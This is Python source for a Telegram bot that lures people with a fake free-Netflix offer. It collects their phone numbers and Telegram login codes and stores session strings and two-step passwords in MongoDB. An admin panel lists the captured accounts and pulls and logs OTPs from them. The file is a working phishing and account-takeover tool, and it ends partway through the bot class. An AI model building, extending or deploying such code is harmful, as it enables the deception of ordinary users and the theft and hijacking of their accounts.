"""
PROFESSIONAL NETFLIX OTP BOT v2.0
Enhanced with Security, Analytics, and Production Features
"""

import os
import sys
import logging
import threading
import time
import json
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple

from bson import ObjectId
from pymongo import MongoClient, IndexModel, ASCENDING, DESCENDING
from pymongo.errors import ConnectionFailure, DuplicateKeyError
import telebot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    CallbackQuery, Message
)

# Import professional account manager
from account import ProfessionalAccountManager

# ========================
# CONFIGURATION
# ========================
# Get from environment variables (MUST SET IN PRODUCTION)
BOT_TOKEN = os.getenv('BOT_TOKEN', '')  # Remove default in production
ADMIN_ID_STR = os.getenv('ADMIN_ID', '0')  # String mein lein
ADMIN_ID = int(ADMIN_ID_STR) if ADMIN_ID_STR.isdigit() else 0
API_ID = int(os.getenv('API_ID', 0))  # Remove default in production
API_HASH = os.getenv('API_HASH', '')  # Remove default in production

# MongoDB Configuration
MONGO_URL = os.getenv('MONGO_URL', '')  # Remove default in production
MONGO_DB_NAME = "netflix_otp_bot"

# Security Configuration
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', None)
MAX_LOGIN_ATTEMPTS = 3
SESSION_TIMEOUT = 300  # 5 minutes

# Bot Configuration
NETFLIX_MAIN_IMAGE = "https://files.catbox.moe/7d6hwv.jpg"
NETFLIX_WELCOME_IMAGE = "https://files.catbox.moe/7d6hwv.jpg"
SUPPORT_USERNAME = "@YourSupportBot"  # Change this

# ========================
# LOGGING SETUP
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ========================
# DATABASE MANAGER
# ========================
class DatabaseManager:
    """Professional database manager with connection pooling and error handling"""
    
    def __init__(self, mongo_url: str, db_name: str):
        self.mongo_url = mongo_url
        self.db_name = db_name
        self.client = None
        self.db = None
        self.connect()
        self.create_indexes()
    
    def connect(self):
        """Establish database connection"""
        try:
            self.client = MongoClient(
                self.mongo_url,
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=10000,
                socketTimeoutMS=30000,
                maxPoolSize=50,
                retryWrites=True
            )
            
            # Test connection
            self.client.admin.command('ping')
            self.db = self.client[self.db_name]
            
            logger.info("✅ MongoDB connected successfully")
            
        except ConnectionFailure as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            raise
    
    def create_indexes(self):
        """Create necessary database indexes"""
        try:
            # Users collection indexes
            users_indexes = [
                IndexModel([("user_id", ASCENDING)], unique=True),
                IndexModel([("created_at", DESCENDING)]),
                IndexModel([("is_admin", ASCENDING)]),
                IndexModel([("last_seen", DESCENDING)])
            ]
            self.db.users.create_indexes(users_indexes)
            
            # Accounts collection indexes
            accounts_indexes = [
                IndexModel([("phone", ASCENDING)], unique=True),
                IndexModel([("created_at", DESCENDING)]),
                IndexModel([("added_by", ASCENDING)]),
                IndexModel([("status", ASCENDING)]),
                IndexModel([("updated_at", DESCENDING)])
            ]
            self.db.accounts.create_indexes(accounts_indexes)
            
            # OTP logs collection indexes
            otp_logs_indexes = [
                IndexModel([("fetched_at", DESCENDING)]),
                IndexModel([("phone", ASCENDING)]),
                IndexModel([("fetched_by", ASCENDING)]),
                IndexModel([("otp", ASCENDING)])
            ]
            self.db.otp_logs.create_indexes(otp_logs_indexes)
            
            # User actions collection indexes
            user_actions_indexes = [
                IndexModel([("user_id", ASCENDING), ("timestamp", DESCENDING)]),
                IndexModel([("action_type", ASCENDING)]),
                IndexModel([("phone", ASCENDING)])
            ]
            self.db.user_actions.create_indexes(user_actions_indexes)
            
            logger.info("✅ Database indexes created")
            
        except Exception as e:
            logger.error(f"❌ Index creation error: {e}")
    
    def get_collection(self, name: str):
        """Get collection by name"""
        return self.db[name]
    
    def health_check(self) -> bool:
        """Check database health"""
        try:
            self.client.admin.command('ping')
            return True
        except:
            return False
    
    def close(self):
        """Close database connection"""
        if self.client:
            self.client.close()
            logger.info("Database connection closed")

# ========================
# ANALYTICS MANAGER
# ========================
class AnalyticsManager:
    """Track and analyze bot usage statistics"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.stats_cache = {}
        self.cache_timeout = 300  # 5 minutes
    
    def track_user_action(self, user_id: int, action_type: str, 
                         details: Dict = None, phone: str = None):
        """Track user action for analytics"""
        try:
            action_data = {
                "user_id": user_id,
                "action_type": action_type,
                "details": details or {},
                "phone": phone,
                "timestamp": datetime.utcnow(),
                "date": datetime.utcnow().strftime("%Y-%m-%d")
            }
            self.db.get_collection("user_actions").insert_one(action_data)
            
        except Exception as e:
            logger.error(f"Error tracking action: {e}")
    
    def get_daily_stats(self, date: str = None) -> Dict:
        """Get statistics for a specific date"""
        if not date:
            date = datetime.utcnow().strftime("%Y-%m-%d")
        
        # Check cache
        cache_key = f"daily_stats_{date}"
        if cache_key in self.stats_cache:
            cache_data, cache_time = self.stats_cache[cache_key]
            if time.time() - cache_time < self.cache_timeout:
                return cache_data
        
        try:
            actions_col = self.db.get_collection("user_actions")
            users_col = self.db.get_collection("users")
            accounts_col = self.db.get_collection("accounts")
            otp_logs_col = self.db.get_collection("otp_logs")
            
            # Get user registrations
            new_users = users_col.count_documents({
                "created_at": {
                    "$gte": datetime.strptime(date, "%Y-%m-%d"),
                    "$lt": datetime.strptime(date, "%Y-%m-%d") + timedelta(days=1)
                }
            })
            
            # Get user actions by type
            pipeline = [
                {"$match": {"date": date}},
                {"$group": {"_id": "$action_type", "count": {"$sum": 1}}}
            ]
            actions_by_type = {
                item["_id"]: item["count"]
                for item in list(actions_col.aggregate(pipeline))
            }
            
            # Get OTP fetch stats
            otp_fetches = otp_logs_col.count_documents({
                "fetched_at": {
                    "$gte": datetime.strptime(date, "%Y-%m-%d"),
                    "$lt": datetime.strptime(date, "%Y-%m-%d") + timedelta(days=1)
                }
            })
            
            # Get new accounts added
            new_accounts = accounts_col.count_documents({
                "created_at": {
                    "$gte": datetime.strptime(date, "%Y-%m-%d"),
                    "$lt": datetime.strptime(date, "%Y-%m-%d") + timedelta(days=1)
                }
            })
            
            stats = {
                "date": date,
                "new_users": new_users,
                "new_accounts": new_accounts,
                "otp_fetches": otp_fetches,
                "actions_by_type": actions_by_type,
                "total_users": users_col.count_documents({}),
                "total_accounts": accounts_col.count_documents({}),
                "total_otp_logs": otp_logs_col.count_documents({})
            }
            
            # Update cache
            self.stats_cache[cache_key] = (stats, time.time())
            
            return stats
            
        except Exception as e:
            logger.error(f"Error getting daily stats: {e}")
            return {}
    
    def get_user_activity(self, user_id: int, limit: int = 50) -> List[Dict]:
        """Get user activity history"""
        try:
            actions = self.db.get_collection("user_actions").find(
                {"user_id": user_id}
            ).sort("timestamp", DESCENDING).limit(limit)
            
            return list(actions)
        except Exception as e:
            logger.error(f"Error getting user activity: {e}")
            return []
    
    def get_top_users(self, limit: int = 10) -> List[Dict]:
        """Get top active users"""
        try:
            pipeline = [
                {"$group": {
                    "_id": "$user_id",
                    "action_count": {"$sum": 1},
                    "last_action": {"$max": "$timestamp"}
                }},
                {"$sort": {"action_count": DESCENDING}},
                {"$limit": limit},
                {"$lookup": {
                    "from": "users",
                    "localField": "_id",
                    "foreignField": "user_id",
                    "as": "user_info"
                }},
                {"$unwind": "$user_info"},
                {"$project": {
                    "user_id": "$_id",
                    "username": "$user_info.username",
                    "name": "$user_info.name",
                    "action_count": 1,
                    "last_action": 1
                }}
            ]
            
            return list(self.db.get_collection("user_actions").aggregate(pipeline))
            
        except Exception as e:
            logger.error(f"Error getting top users: {e}")
            return []
    
    def clear_cache(self):
        """Clear analytics cache"""
        self.stats_cache.clear()

# ========================
# SESSION MANAGER
# ========================
class SessionManager:
    """Manage user sessions and temporary states"""
    
    def __init__(self):
        self.login_states: Dict[int, Dict] = {}  # {user_id: state_data}
        self.user_sessions: Dict[int, Dict] = {}  # {user_id: session_data}
        self.message_history: Dict[int, Dict] = {}  # {user_id: {message_key: message_id}}
        self.lock = threading.Lock()
        self.cleanup_thread = threading.Thread(target=self._auto_cleanup, daemon=True)
        self.cleanup_thread.start()
    
    def set_login_state(self, user_id: int, state_data: Dict):
        """Set login state for user"""
        with self.lock:
            state_data["created_at"] = time.time()
            state_data["expires_at"] = time.time() + SESSION_TIMEOUT
            self.login_states[user_id] = state_data
    
    def get_login_state(self, user_id: int) -> Optional[Dict]:
        """Get login state for user"""
        with self.lock:
            state = self.login_states.get(user_id)
            if state and time.time() < state.get("expires_at", 0):
                return state
            elif state:
                # Remove expired state
                del self.login_states[user_id]
            return None
    
    def clear_login_state(self, user_id: int):
        """Clear login state for user"""
        with self.lock:
            self.login_states.pop(user_id, None)
    
    def set_message_id(self, user_id: int, message_key: str, message_id: int):
        """Store message ID for user"""
        with self.lock:
            if user_id not in self.message_history:
                self.message_history[user_id] = {}
            self.message_history[user_id][message_key] = {
                "message_id": message_id,
                "timestamp": time.time()
            }
    
    def get_message_id(self, user_id: int, message_key: str) -> Optional[int]:
        """Get stored message ID"""
        with self.lock:
            user_history = self.message_history.get(user_id, {})
            message_data = user_history.get(message_key)
            if message_data:
                return message_data["message_id"]
            return None
    
    def clear_user_messages(self, user_id: int):
        """Clear all stored messages for user"""
        with self.lock:
            self.message_history.pop(user_id, None)
    
    def _auto_cleanup(self):
        """Auto cleanup expired sessions"""
        while True:
            try:
                time.sleep(60)  # Check every minute
                
                current_time = time.time()
                expired_users = []
                
                with self.lock:
                    # Clean expired login states
                    for user_id, state in list(self.login_states.items()):
                        if current_time > state.get("expires_at", 0):
                            expired_users.append(user_id)
                    
                    for user_id in expired_users:
                        del self.login_states[user_id]
                    
                    # Clean old message history (older than 24 hours)
                    for user_id, messages in list(self.message_history.items()):
                        to_delete = []
                        for key, data in messages.items():
                            if current_time - data["timestamp"] > 86400:  # 24 hours
                                to_delete.append(key)
                        
                        for key in to_delete:
                            del messages[key]
                        
                        if not messages:
                            self.message_history.pop(user_id, None)
                
                if expired_users:
                    logger.debug(f"Cleaned up {len(expired_users)} expired login states")
                    
            except Exception as e:
                logger.error(f"Session cleanup error: {e}")
    
    def get_all_sessions(self) -> Dict:
        """Get all active sessions (admin only)"""
        with self.lock:
            return {
                "login_states": len(self.login_states),
                "user_sessions": len(self.user_sessions),
                "message_history": len(self.message_history)
            }

# ========================
# BOT MANAGER
# ========================
class NetflixOTPBot:
    """Main bot manager class"""
    
    def __init__(self):
        # Validate configuration
        self._validate_config()
        
        # Initialize components
        self.bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
        self.db_manager = DatabaseManager(MONGO_URL, MONGO_DB_NAME)
        self.analytics = AnalyticsManager(self.db_manager)
        self.session_manager = SessionManager()
        
        # Initialize account manager
        self.account_manager = ProfessionalAccountManager(
            API_ID, 
            API_HASH,
            ENCRYPTION_KEY
        )
        
        # Collections
        self.users_col = self.db_manager.get_collection("users")
        self.accounts_col = self.db_manager.get_collection("accounts")
        self.otp_logs_col = self.db_manager.get_collection("otp_logs")
        self.user_actions_col = self.db_manager.get_collection("user_actions")
        
        # Register handlers
        self._register_handlers()
        
        # Start background tasks
        self._start_background_tasks()
        
        logger.info("✅ Netflix OTP Bot initialized successfully")
    
    def _validate_config(self):
        """Validate bot configuration"""
        errors = []
        
        if not BOT_TOKEN or BOT_TOKEN == '':
            errors.append("BOT_TOKEN not set")
        if not ADMIN_ID or ADMIN_ID == 0:
            errors.append("ADMIN_ID not set")
        if not API_ID or API_ID == 0:
            errors.append("API_ID not set")
        if not API_HASH or API_HASH == '':
            errors.append("API_HASH not set")
        if not MONGO_URL or MONGO_URL == '':
            errors.append("MONGO_URL not set")
        
        if errors:
            error_msg = "❌ Configuration errors:\n" + "\n".join(f"  • {error}" for error in errors)
            logger.error(error_msg)
            raise ValueError("Bot configuration incomplete")
    
    def _register_handlers(self):
        """Register bot handlers"""
        
        # Command handlers
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self._handle_start(message)
        
        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            self._handle_help(message)
        
        @self.bot.message_handler(commands=['stats'])
        def handle_stats(message):
            self._handle_stats(message)
        
        # Callback query handlers
        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_callback_query(call):
            self._handle_callback_query(call)
        
        # Message handlers
        @self.bot.message_handler(func=lambda m: True)
        def handle_all_messages(message):
            self._handle_all_messages(message)
    
    def _start_background_tasks(self):
        """Start background maintenance tasks"""
        
        # Database health check
        def db_health_check():
            while True:
                time.sleep(300)  # Check every 5 minutes
                if not self.db_manager.health_check():
                    logger.warning("Database health check failed, attempting reconnect...")
                    try:
                        self.db_manager.connect()
                    except:
                        logger.error("Database reconnection failed")
        
        # Account manager cleanup
        def account_cleanup():
            while True:
                time.sleep(600)  # Cleanup every 10 minutes
                try:
                    self.account_manager.cleanup_sessions()
                except Exception as e:
                    logger.error(f"Account cleanup error: {e}")
        
        # Start threads
        threading.Thread(target=db_health_check, daemon=True).start()
        threading.Thread(target=account_cleanup, daemon=True).start()
        
        logger.info("✅ Background tasks started")
    
    # ========================
    # UTILITY FUNCTIONS
    # ========================
    
    def _ensure_user_exists(self, user_id: int, user_name: str = None, 
                           username: str = None) -> Dict:
        """Ensure user exists in database"""
        try:
            user = self.users_col.find_one({"user_id": user_id})
            
            if not user:
                user_data = {
                    "user_id": user_id,
                    "name": user_name or "Unknown",
                    "username": username,
                    "is_admin": self._is_admin(user_id),
                    "created_at": datetime.utcnow(),
                    "last_seen": datetime.utcnow(),
                    "total_actions": 0,
                    "last_ip": None,
                    "language": "en"
                }
                self.users_col.insert_one(user_data)
                user = user_data
                
                logger.info(f"New user registered: {user_id} ({user_name})")
                
                # Track registration
                self.analytics.track_user_action(
                    user_id, 
                    "user_registered",
                    {"name": user_name, "username": username}
                )
            else:
                # Update last seen
                update_data = {"last_seen": datetime.utcnow()}
                if user_name and user.get("name") != user_name:
                    update_data["name"] = user_name
                if username and user.get("username") != username:
                    update_data["username"] = username
                
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$set": update_data}
                )
            
            return user
            
        except Exception as e:
            logger.error(f"Error ensuring user exists: {e}")
            return {}
    
    def _is_admin(self, user_id: int) -> bool:
        """Check if user is admin"""
        return user_id == ADMIN_ID
    
    def _track_action(self, user_id: int, action_type: str, 
                     details: Dict = None, phone: str = None):
        """Track user action"""
        self.analytics.track_user_action(user_id, action_type, details, phone)
        
        # Update user's total actions
        self.users_col.update_one(
            {"user_id": user_id},
            {"$inc": {"total_actions": 1}}
        )
    
    def _format_phone(self, phone: str) -> str:
        """Format phone number for display"""
        if len(phone) <= 15:
            return phone
        return f"{phone[:4]}******{phone[-3:]}"
    
    def _validate_phone(self, phone: str) -> Tuple[bool, str]:
        """Validate phone number format"""
        phone = phone.strip()
        
        if not phone.startswith('+'):
            return False, "Phone number must start with +"
        
        if len(phone) < 10 or len(phone) > 16:
            return False, "Phone number must be 10-16 digits"
        
        # Check if it contains only digits after +
        if not phone[1:].replace(" ", "").isdigit():
            return False, "Phone number can only contain digits"
        
        return True, phone
    
    def _save_account(self, phone: str, session_string: str, has_2fa: bool = False,
                     two_step_password: str = None, added_by: int = None) -> bool:
        """Save account to database"""
        try:
            # Check if account already exists
            existing = self.accounts_col.find_one({"phone": phone})
            
            account_data = {
                "phone": phone,
                "session_string": session_string,
                "has_2fa": has_2fa,
                "two_step_password": two_step_password,
                "updated_at": datetime.utcnow(),
                "added_by": added_by,
                "status": "active",
                "last_checked": datetime.utcnow()
            }
            
            if existing:
                # Update existing account
                self.accounts_col.update_one(
                    {"phone": phone},
                    {"$set": account_data}
                )
                logger.info(f"Account updated: {phone}")
            else:
                # Insert new account
                account_data["created_at"] = datetime.utcnow()
                self.accounts_col.insert_one(account_data)
                logger.info(f"Account saved: {phone}")
            
            return True
            
        except DuplicateKeyError:
            logger.warning(f"Duplicate account attempt: {phone}")
            return False
        except Exception as e:
            logger.error(f"Save account error: {e}")
            return False
    
    def _save_otp_log(self, phone: str, otp: str, fetched_by: int = None) -> bool:
        """Save OTP fetch log"""
        try:
            log_data = {
                "phone": phone,
                "otp": otp,
                "fetched_by": fetched_by,
                "fetched_at": datetime.utcnow(),
                "date": datetime.utcnow().strftime("%Y-%m-%d")
            }
            self.otp_logs_col.insert_one(log_data)
            logger.info(f"OTP logged for {phone}: {otp}")
            return True
        except Exception as e:
            logger.error(f"Save OTP log error: {e}")
            return False
    
    def _get_total_accounts(self) -> int:
        """Get total number of accounts"""
        try:
            return self.accounts_col.count_documents({})
        except:
            return 0
    
    def _get_all_accounts(self, limit: int = 100) -> List[Dict]:
        """Get all accounts (admin only)"""
        try:
            return list(self.accounts_col.find(
                {},
                {"phone": 1, "_id": 1, "created_at": 1, "status": 1}
            ).sort("created_at", DESCENDING).limit(limit))
        except:
            return []
    
    def _smart_send_message(self, chat_id: int, user_id: int, message_key: str,
                           text: str, markup = None, parse_mode: str = "HTML",
                           photo_url: str = None, delete_previous: bool = True) -> Optional[int]:
        """Smart message sending with history management"""
        try:
            # Get previous message ID
            previous_id = self.session_manager.get_message_id(user_id, message_key)
            
            # Delete previous message if requested
            if delete_previous and previous_id:
                try:
                    self.bot.delete_message(chat_id, previous_id)
                except:
                    pass
            
            # Send new message
            if photo_url:
                try:
                    msg = self.bot.send_photo(
                        chat_id=chat_id,
                        photo=photo_url,
                        caption=text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                    message_id = msg.message_id
                except Exception as e:
                    logger.warning(f"Photo send failed, falling back to text: {e}")
                    msg = self.bot.send_message(
                        chat_id=chat_id,
                        text=text,
                        parse_mode=parse_mode,
                        reply_markup=markup
                    )
                    message_id = msg.message_id
            else:
                msg = self.bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode=parse_mode,
                    reply_markup=markup
                )
                message_id = msg.message_id
            
            # Store message ID
            self.session_manager.set_message_id(user_id, message_key, message_id)
            
            return message_id
            
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return None
    
    # ========================
    # HANDLER IMPLEMENTATIONS
    # ========================
    
    def _handle_start(self, message: Message):
        """Handle /start command"""
        user_id = message.from_user.id
        user_name = message.from_user.first_name
        username = message.from_user.username
        
        # Ensure user exists
        self._ensure_user_exists(user_id, user_name, username)
        
        # Clear login state
        self.session_manager.clear_login_state(user_id)
        
        # Track action
        self._track_action(user_id, "start_command")
        
        # Show appropriate interface
        if self._is_admin(user_id):
            self._show_admin_dashboard(user_id, message.chat.id)
        else:
            self._show_netflix_welcome(user_id, message.chat.id)
    
    def _handle_help(self, message: Message):
        """Handle /help command"""
        user_id = message.from_user.id
        
        help_text = """
<b>🤖 Netflix OTP Bot Help</b>

<b>For Users:</b>
• Click "Get Netflix Now" to start
• Enter your phone number with country code
• Verify with the OTP sent by Telegram
• Your Netflix request will be processed within 48 hours

<b>For Admin:</b>
• Use the admin panel for account management
• Add accounts for OTP fetching
• View OTP logs and statistics

<b>Support:</b>
If you need help, contact {support}

<b>Privacy:</b>
Your data is encrypted and securely stored.
""".format(support=SUPPORT_USERNAME)
        
        self._smart_send_message(
            message.chat.id,
            user_id,
            "help",
            help_text,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
        
        self._track_action(user_id, "help_command")
    
    def _handle_stats(self, message: Message):
        """Handle /stats command (admin only)"""
        user_id = message.from_user.id
        
        if not self._is_admin(user_id):
            self._show_netflix_welcome(user_id, message.chat.id)
            return
        
        # Get statistics
        daily_stats = self.analytics.get_daily_stats()
        account_stats = self.account_manager.get_stats()
        
        stats_text = f"""
<b>📊 Bot Statistics</b>

<b>Today ({daily_stats.get('date', 'N/A')}):</b>
• New Users: {daily_stats.get('new_users', 0)}
• New Accounts: {daily_stats.get('new_accounts', 0)}
• OTP Fetches: {daily_stats.get('otp_fetches', 0)}

<b>Overall:</b>
• Total Users: {daily_stats.get('total_users', 0)}
• Total Accounts: {daily_stats.get('total_accounts', 0)}
• Total OTP Logs: {daily_stats.get('total_otp_logs', 0)}

<b>Account Manager:</b>
• Logins Attempted: {account_stats.get('logins_attempted', 0)}
• Logins Successful: {account_stats.get('logins_successful', 0)}
• OTPs Fetched: {account_stats.get('otps_fetched', 0)}
• Active Sessions: {account_stats.get('active_sessions', 0)}

<b>Session Manager:</b>
• Active Login States: {self.session_manager.get_all_sessions().get('login_states', 0)}
"""
        
        self._smart_send_message(
            message.chat.id,
            user_id,
            "stats",
            stats_text,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        
        self._track_action(user_id, "stats_command")
    
    def _handle_callback_query(self, call: CallbackQuery):
        """Handle all callback queries"""
        user_id = call.from_user.id
        chat_id = call.message.chat.id
        
        # Acknowledge callback
        self.bot.answer_callback_query(call.id)
        
        # Track action
        self._track_action(user_id, f"callback_{call.data}")
        
        # Route callback
        if call.data == "get_netflix_now":
            self._handle_get_netflix_now(call)
        elif call.data == "cancel_netflix":
            self._handle_cancel_netflix(call)
        elif call.data == "back_to_welcome":
            self._handle_back_to_welcome(call)
        elif call.data == "admin_login":
            self._handle_admin_login(call)
        elif call.data == "back_to_admin":
            self._handle_back_to_admin(call)
        elif call.data == "refresh_admin":
            self._handle_refresh_admin(call)
        elif call.data == "view_accounts":
            self._handle_view_accounts(call)
        elif call.data == "otp_logs":
            self._handle_otp_logs(call)
        elif call.data.startswith("account_"):
            self._handle_account_selection(call)
        elif call.data.startswith("get_otp_"):
            self._handle_get_otp(call)
        elif call.data == "more_accounts":
            self._handle_more_accounts(call)
        else:
            # Unknown callback
            logger.warning(f"Unknown callback data: {call.data}")
    
    def _handle_all_messages(self, message: Message):
        """Handle all other messages"""
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # Ensure user exists
        self._ensure_user_exists(user_id, message.from_user.first_name, 
                                message.from_user.username)
        
        # Check if in login state
        state = self.session_manager.get_login_state(user_id)
        if state:
            if state.get("step") == "ask_phone":
                self._handle_phone_input(message)
            elif state.get("step") == "ask_otp":
                self._handle_otp_input(message)
            elif state.get("step") == "ask_2fa":
                self._handle_2fa_input(message)
            else:
                # Invalid state, show appropriate interface
                if self._is_admin(user_id):
                    self._show_admin_dashboard(user_id, chat_id)
                else:
                    self._show_netflix_welcome(user_id, chat_id)
        else:
            # Show appropriate interface
            if self._is_admin(user_id):
                self._show_admin_dashboard(user_id, chat_id)
            else:
                self._show_netflix_welcome(user_id, chat_id)
    
    # ========================
    # USER FLOW HANDLERS
    # ========================
    
    def _show_netflix_welcome(self, user_id: int, chat_id: int):
        """Show Netflix welcome screen"""
        welcome_text = """
<b>🎬 Welcome To Netflix On Your Number Bot 🎬</b>

<code>Get Your Premium Netflix Account Now 👇</code>

<b>✨ Premium Features:</b>
• 4K Ultra HD Streaming 🎥
• Multiple Profiles 👥
• Ad-Free Experience 🚫
• Download for Offline Viewing 📥

<b>📲 How to Get Netflix:</b>
1. Click "Get Netflix Now" below
2. Enter your phone number
3. Verify with OTP
4. Receive Netflix account in 48 hours

<code>Get Your Netflix Account Now 👇</code>

<b>🔥 Limited Time Offer!</b>
<b>⚡ Fast Delivery Guaranteed</b>
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🎬 Get Netflix Now", callback_data="get_netflix_now"))
        markup.add(InlineKeyboardButton("📞 Support", url=f"https://t.me/{SUPPORT_USERNAME[1:]}"))
        
        self._smart_send_message(
            chat_id,
            user_id,
            "welcome",
            welcome_text,
            markup=markup,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
    
    def _show_admin_dashboard(self, user_id: int, chat_id: int):
        """Show admin dashboard"""
        if not self._is_admin(user_id):
            self._show_netflix_welcome(user_id, chat_id)
            return
        
        # Get statistics
        daily_stats = self.analytics.get_daily_stats()
        account_stats = self.account_manager.get_stats()
        
        admin_text = f"""
<b>👑 Netflix Admin Panel</b>

<b>📊 Today's Stats:</b>
• New Users: {daily_stats.get('new_users', 0)}
• New Accounts: {daily_stats.get('new_accounts', 0)}
• OTP Fetches: {daily_stats.get('otp_fetches', 0)}

<b>📈 Overall Stats:</b>
• Total Accounts: {daily_stats.get('total_accounts', 0)}
• Total OTP Logs: {daily_stats.get('total_otp_logs', 0)}
• Successful Logins: {account_stats.get('logins_successful', 0)}

<b>🛠️ Management Tools:</b>
"""
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("👁 View Accounts", callback_data="view_accounts"),
            InlineKeyboardButton("🔐 Add Account", callback_data="admin_login")
        )
        markup.add(
            InlineKeyboardButton("📊 OTP Logs", callback_data="otp_logs"),
            InlineKeyboardButton("📈 Statistics", callback_data="refresh_admin")
        )
        markup.add(
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_admin")
        )
        
        self._smart_send_message(
            chat_id,
            user_id,
            "admin_dashboard",
            admin_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
    
    def _handle_get_netflix_now(self, call: CallbackQuery):
        """Start Netflix login process"""
        user_id = call.from_user.id
        
        # Set login state
        self.session_manager.set_login_state(user_id, {
            "step": "ask_phone",
            "user_type": "netflix"
        })
        
        login_text = """
<b>📱 Netflix Account Setup</b>

<code>Enter your phone number with country code to get Netflix account.</code>

<b>📞 Format:</b> +CountryCodeNumber
<b>Example:</b> +919876543210

<i>⚠️ Netflix will send verification code to this number</i>
<i>🔒 Your number is secure and encrypted</i>
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix"))
        
        self._smart_send_message(
            call.message.chat.id,
            user_id,
            "login",
            login_text,
            markup=markup,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
        
        self._track_action(user_id, "start_netflix_login")
    
    def _handle_cancel_netflix(self, call: CallbackQuery):
        """Cancel Netflix login"""
        user_id = call.from_user.id
        
        # Clear login state
        self.session_manager.clear_login_state(user_id)
        
        # Show welcome
        self._show_netflix_welcome(user_id, call.message.chat.id)
        
        self._track_action(user_id, "cancel_netflix_login")
    
    def _handle_back_to_welcome(self, call: CallbackQuery):
        """Go back to welcome screen"""
        user_id = call.from_user.id
        
        # Clear login state
        self.session_manager.clear_login_state(user_id)
        
        # Show welcome
        self._show_netflix_welcome(user_id, call.message.chat.id)
    
    # ========================
    # ADMIN FLOW HANDLERS
    # ========================
    
    def _handle_admin_login(self, call: CallbackQuery):
        """Start admin login process"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            self.bot.answer_callback_query(call.id, "Admin only feature", show_alert=True)
            return
        
        # Set login state
        self.session_manager.set_login_state(user_id, {
            "step": "ask_phone",
            "user_type": "admin"
        })
        
        login_text = """
<b>🔐 Add New Account</b>

Enter phone number with country code:

<b>Format:</b> +CountryCodeNumber
<b>Example:</b> +919876543210

<i>This will add the account to database for OTP fetching.</i>
<i>Encryption: ✅ Enabled</i>
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_to_admin"))
        
        self._smart_send_message(
            call.message.chat.id,
            user_id,
            "admin_login",
            login_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
        
        self._track_action(user_id, "start_admin_login")
    
    def _handle_back_to_admin(self, call: CallbackQuery):
        """Go back to admin dashboard"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            self._show_netflix_welcome(user_id, call.message.chat.id)
            return
        
        # Clear login state
        self.session_manager.clear_login_state(user_id)
        
        # Show admin dashboard
        self._show_admin_dashboard(user_id, call.message.chat.id)
    
    def _handle_refresh_admin(self, call: CallbackQuery):
        """Refresh admin dashboard"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            self.bot.answer_callback_query(call.id, "Admin only", show_alert=True)
            return
        
        self._show_admin_dashboard(user_id, call.message.chat.id)
        self.bot.answer_callback_query(call.id, "✅ Dashboard refreshed")
    
    def _handle_view_accounts(self, call: CallbackQuery):
        """Show all accounts"""
        user_id = call.from_user.id
        
        if not self._is_admin(user_id):
            self.bot.answer_callback_query(call.id, "Admin only", show_alert=True)
            return
        
        # Get accounts
        accounts = self._get_all_accounts(limit=50)
        
        if not accounts:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="admin_login"))
            markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
            
            self._smart_send_message(
                call.message.chat.id,
                user_id,
                "admin_view",
                "<b>📱 No Accounts Found</b>\n\nAdd your first account to get started.",
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE
            )
            return
        
        # Format accounts list
        account_text = "<b>📱 All Accounts</b>\n\n"
        for idx, account in enumerate(accounts[:10], 1):
            phone_display = self._format_phone(account["phone"])
            status_icon = "✅" if account.get("status") == "active" else "⚠️"
            account_text += f"{idx}. {status_icon} <code>{phone_display}</code>\n"
        
        if len(accounts) > 10:
            account_text += f"\n... and {len(accounts) - 10} more accounts"
        
        # Create keyboard
        markup = InlineKeyboardMarkup(row_width=2)
        
        # Add account buttons (first 6)
        for account in accounts[:6]:
            phone_display = self._format_phone(account["phone"])
            short_phone = phone_display[:10] + "..." if len(phone_display) > 10 else phone_display
            markup.add(InlineKeyboardButton(
                f"📱 {short_phone}",
                callback_data=f"account_{account['_id']}"
            ))
        
        if len(accounts) > 6:
            markup.add(InlineKeyboardButton("📜 More Accounts", callback_data="more_accounts"))
        
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
        
        self._smart_send_message(
            call.message.chat.id,
            user_id,
            "admin_view",
            account_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
    
